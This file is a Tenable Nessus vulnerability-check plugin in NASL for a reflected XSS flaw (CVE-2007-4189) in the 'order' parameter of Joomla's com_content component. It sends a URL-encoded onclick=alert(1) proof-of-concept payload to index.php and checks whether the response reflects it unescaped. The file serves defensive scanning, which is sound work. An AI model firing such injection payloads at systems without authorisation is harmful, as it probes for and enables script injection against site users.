#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25823);
  script_version("$Revision: 1.28 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2007-4189");
  script_bugtraq_id(25122);
  script_osvdb_id(38756);

  script_name(english:"Joomla! com_content Component 'order' Parameter XSS");
  script_summary(english:"Attempts to exploit an XSS issue in com_content.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is affected by a
cross-site scripting (XSS) vulnerability in com_content/content.php
due to improper sanitization of user-supplied input to the 'order'
parameter before using it to generate dynamic HTML content. An
unauthenticated, remote attacker can exploit this to inject arbitrary
HTML and script code into the user's browser session. 

Note that this version of Joomla! may be affected by a session
fixation vulnerability in the administrator application as well as
several other cross-site scripting and cross-site request forgery
vulnerabilities; however, Nessus has not checked for these.");
  # http://web.archive.org/web/20080201033408/http://www.joomla.org/content/view/3670/78/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dadacc25");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.0.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value: "2007/07/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/07/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/08/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Try to exploit the issue.
xss = "nessus-" + unixtime() + "\" + "'" + '\\"' + " onclick=alert(1); " + 'nessus=\\"';
exss = urlencode(
  str        : xss,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/=;\\"
);

if (thorough_tests) cats = make_list(1, 3, 7);
else cats = make_list(1);
foreach cat (cats)
{
  u = "/index.php?option=com_content&task=category&sectionid=-1&id=" + cat +
    "&Itemid=-9&order=" + exss + "&limit=10&limitstart=0";

  w = http_send_recv3(
    method:"GET",
    item: dir + u,
    exit_on_fail: TRUE,
    port:port
  );
  res = strcat(w[0], w[1], '\r\n', w[2]);

  # There's a problem if we see our exploit.
  # account for Joomla's escaping of our exploit.
  xss2 = str_replace(find:"\", replace:"\\\", string:xss);
  if (
    # not search-engine optimized
    "order=" +xss2+ "&amp;limit=' + this.options[selectedIndex]" >< res ||
    # search-engine optimized
    "order," +xss2+ "/' + this.options[selectedIndex]" >< res
  )
  {
    output = extract_pattern_from_resp(string: res, pattern: "ST:"+xss2);
    if (empty_or_null(output)) output = w[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_WARNING,
      generic     : TRUE,
      request     : make_list(install_url + u),
      output      : chomp(output),
      xss         : TRUE
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
